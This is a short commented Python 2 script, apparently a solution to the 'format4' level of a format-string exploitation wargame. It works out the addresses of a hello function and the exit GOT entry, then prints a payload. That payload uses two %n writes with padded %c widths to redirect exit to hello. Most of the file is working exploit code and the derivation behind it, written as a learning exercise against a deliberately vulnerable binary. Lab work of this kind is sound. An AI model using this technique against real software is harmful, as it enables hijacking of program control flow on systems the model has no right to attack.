#get the address of the hello function  with objdump -t ./format4 | grep hello
#result: 080484b4, this in little endian

#we have to overwrite the exit function, so we need to execute obdump -TR ./format4 and get the address of exit in dynamic record
#result: 08049724 

#The method is in reference with the next page:http://jbremer.org/format-string-vulnerabilities/
#We want to write in two small int the higher and lower values in the respective address
#So, the first address (08049724) will content the lower value and the second address (08049726) the higher 
#To get the value it is simple, we want to introduce the address of hello:080484b4
#So, the lower value is in this case 0x84b4 and the higher is 0x0804
#but, the higher value it is necessary a positive number so we adjust by adding 0x10000
#but if the number it is not necessary the sum of 0x10000, we adjust again.

#lower = int("0x84b4", 16) #33972
#higher = int("0x0804", 16) #2052
#newhigher = (higher - lower + 0x10000) & 0xffff #33616



#the lower value we must to quit the first 8 bits because it is the lenght of the two address.
#lower = lower - 8 #33964
#we add the % in the beginning and the letter c at the end because we need to add this size of 
#entrys, to write the correct number lower and higher.


slower = "%33964c"
shigher= "%33616c"
first_address = "\x24\x97\x04\x08"
second_address = "\x26\x97\x04\x08"


#We known the first parameter will content the first address
#We have to search by this first address to get the index of parameter to write with $n
#So we found the first_address is in the 4th parameter so the second_address will be in the 5th

first_parameter = "%4$n" #we write in the 4th parameter (the first_address)
second_parameter = "%5$n" #we write in the 5th parameter (the second_address)



print first_address + second_address + slower + first_parameter + shigher + second_parameter


